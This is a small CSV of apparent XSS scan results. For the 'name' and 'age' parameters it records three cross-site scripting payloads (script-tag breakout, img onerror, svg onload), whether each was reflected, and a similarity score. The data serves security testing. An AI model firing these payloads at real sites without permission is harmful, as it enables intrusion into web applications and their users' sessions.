param,payload,vulnerable,similarity,notes
name,"""><script>alert(1)</script>",True,0.6204188481675392,payload reflected in raw HTML (maybe attribute)
name,"""><img src=x onerror=alert(1)>",True,0.8419689119170984,payload reflected in raw HTML (maybe attribute)
name,<svg/onload=confirm(1)>,False,0.0,no response
age,"""><script>alert(1)</script>",True,0.7864583333333334,payload reflected in raw HTML (maybe attribute)
age,"""><img src=x onerror=alert(1)>",False,0.0,no response
age,<svg/onload=confirm(1)>,True,0.7973684210526316,payload reflected in raw HTML (maybe attribute)
